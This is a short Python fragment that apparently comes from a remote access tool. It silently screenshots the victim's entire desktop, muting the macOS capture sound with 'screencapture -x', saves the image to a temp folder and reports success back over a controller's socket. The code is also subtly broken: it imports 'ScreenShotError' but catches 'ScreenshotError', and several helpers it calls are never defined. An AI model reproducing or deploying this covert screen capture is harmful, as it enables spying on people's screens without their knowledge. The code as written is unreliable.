
import os
import sys
from os import rename
from os.path import isfile
from mss.exception import ScreenShotError

temp = get_temp()

o = os.path.join(temp,'fs.jpg')
try:
    with MSS() as screenshotter:
        if osx_client():
            result=run_command('screencapture -x {}'.format(o))
            if not no_error(result):
                screenshotter.max_displays = 32
                next(screenshotter.save(mon=-1, output=o))
        else:
            #print("\nA screenshot to grab them all")
            next(screenshotter.save(mon=-1, output=o))
        send(client_socket,'[+] Screenshot has been taken!')
except ScreenshotError as ex:
    err = "ERROR: {}".format(ex)
    send(client_socket,err)
